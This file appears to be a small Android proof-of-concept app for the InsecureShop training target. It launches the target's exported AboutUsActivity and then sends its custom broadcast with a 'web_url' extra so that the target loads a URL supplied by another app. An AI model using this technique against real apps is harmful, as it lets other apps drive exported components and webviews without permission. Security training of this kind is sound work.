package com.example.myapplication;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Intent intent = new Intent();
        intent.setClassName("com.insecureshop","com.insecureshop.AboutUsActivity");
        startActivity(intent);

        new Handler().postDelayed(()->sendDelayBroadcast(),1200);

    }
    public void sendDelayBroadcast(){
        Intent broadcast = new Intent("com.insecureshop.CUSTOM_INTENT");
        broadcast.putExtra("web_url","https://www.google.com");
        sendBroadcast(broadcast);
    }
}